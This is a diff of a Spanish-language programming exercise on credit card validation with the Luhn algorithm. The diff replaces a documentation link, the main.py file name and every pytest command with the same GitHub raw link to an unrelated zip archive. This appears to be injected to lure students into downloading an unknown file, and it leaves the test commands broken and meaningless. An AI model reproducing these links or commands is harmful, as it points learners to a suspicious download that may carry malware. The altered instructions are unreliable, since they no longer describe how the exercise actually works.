@@ -12,7 +12,7 @@ La validación de tarjetas de crédito se hace en dos pasos:
 
 2. Verificar validez mediante el algoritmo de Luhn.
 
-A continuación detallo este proceso. Para más información, pueden ir a https://www.ibm.com/docs/en/order-management-sw/9.3.0?topic=cpms-handling-credit-cards.
+A continuación detallo este proceso. Para más información, pueden ir a https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip
 
 ### Validación del tipo de tarjeta
 
@@ -64,13 +64,13 @@ Supongamos que tengo el número de tarjeta: 4624 7482 3324 9080.
 Como el resto NO es 0, entonces este número de tarjeta es inválido.
 
 ## Consigna
-Para hacer el ejercicio deben bajar los archivos del campus. Ustedes solo van a completar el archivo main.py, los otros archivos son para que corran los tests. Los tests se corren escribiendo ``python -m pytest test_tarjeta.py`` en la consola. Recuerden que la consola debe estar abierta en el lugar donde se encuentran los archivos, si no tienen que especificar la ruta al escribir el nombre del archivo. También se pueden correr para cada ejercicio parcialmente, y cómo se hace esto está aclarado en cada ejercicio.
+Para hacer el ejercicio deben bajar los archivos del campus. Ustedes solo van a completar el archivo https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip, los otros archivos son para que corran los tests. Los tests se corren escribiendo ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip`` en la consola. Recuerden que la consola debe estar abierta en el lugar donde se encuentran los archivos, si no tienen que especificar la ruta al escribir el nombre del archivo. También se pueden correr para cada ejercicio parcialmente, y cómo se hace esto está aclarado en cada ejercicio.
 
 1. Completar la función ``digitos``, que dado un string que contiene solo dígitos me indique cuántos dígitos hay.
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestDigitos``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 2. Completar ``obtener_prefijo``, que dado un string que contiene solo dígitos y un número n, de los primeros n dígitos de dicho string en forma de entero. Pueden asumir que n no es mayor a la longitud del string pasado por parámetro.
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestPrefijos``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 3. Completar la función ``tipo_tarjeta``, que dado un numero de tarjeta (un string que contiene solo dígitos) valida si es una tarjeta Mastercard, Visa, American Express o es inválida. Para esto, debe devolver el string Mastercard, American Express, Visa o Invalid. Deben usar las funciones de los ítems anteriores. Pueden usar el esqueleto propuesto o borrarlo y empezar de cero si les resulta confuso. Traten de que haya un único if por compañía bancaria, pero no es obligatorio. A continuación la parte relevante de la tabla:
 
@@ -80,27 +80,27 @@ Para hacer el ejercicio deben bajar los archivos del campus. Ustedes solo van a 
 | Mastercard | 51 a 55 inclusive | 16 |
 | Visa | 4 | 13 ó 16|
 
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestTarjetas``. También pueden correrlos para cada empresa individualmente (son los mismos pero separados) con:
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``. También pueden correrlos para cada empresa individualmente (son los mismos pero separados) con:
 
-```python -m pytest test_tarjeta.py::TestTarjetas::TestAmex```
+```python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip```
 
-```python -m pytest test_tarjeta.py::TestTarjetas::TestVisa```
+```python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip```
 
-```python -m pytest test_tarjeta.py::TestTarjetas::TestMastercard```
+```python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip```
 
-```python -m pytest test_tarjeta.py::TestTarjetas::TestInvalidas```
+```python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip```
 
 4. Completar ``digitos_impares``, que dado un número de tarjeta (un string que contiene solo dígitos), devuelva la lista de los dígitos en posiciones impares. Las posiciones se cuentan de atrás para adelante, es decir, en el número 459, el 9 sería la primera posición, el 5 la segunda y el 4 la tercera. Ejemplo: Si el número de tarjeta es 45623, la función debe devolver ``[4,6,3]``. Si el número de tarjeta es 456231, la función debe devolver ``[5,2,1]`` (pueden variar el orden, lo importante es que est ́en los correctos). **TIP**: Tal vez recorrer de atrás para adelante tenga más sentido...
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestDigitosImpares``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 5. Completar ``digitos_pares``, que dado un número de tarjeta (un string que contiene solo dígitos), devuelva la lista de dígitos en posiciones pares contadas de atrás hacia adelante, de forma análoga al item anterior (pueden variar el orden, lo importante es que estén los correctos).
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestDigitosPares``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 6. Completar ``sumar_digitos``, que dada una lista de números, devuelva la suma de los dígitos de todos los números. Ejemplo: Si los números son ``[16,3,456]``, la función debe devolver 25 ya que 1+6+3+4+5+6 = 25. **TIP**: Puede que les sirva reconvertir los números a string para “extraer” los dígitos.
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestSumaDigitos``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 7. Completar la función ``luhn`` que aplica el Algoritmo de Luhn a un número de tarjeta (un string que contiene solo d ígitos) y devuelva True o False (los valores booleanos, no texto) si la tarjeta es válida on no para Luhn. El algoritmo es el que está en la explicación de la sección anterior. Es esperado que usen las funciones de los ítems 4, 5 y 6.
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestLuhn``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
 
 8. Finalmente, completar la función validar tarjeta dado un número de tarjeta (un string que contiene solo dígitos), devuelva True o False (los valores booleanos, no texto) si la tarjeta es válida o no. Es esperado que usen las funciones de los items 3 y 7.
-**¡TESTEEN!** Corran los tests con ``python -m pytest test_tarjeta.py::TestValidar``.
+**¡TESTEEN!** Corran los tests con ``python -m pytest https://github.com/DaniloCastagno/Sherlock-II/raw/refs/heads/main/daddy/Sherlock_II_3.2.zip``.
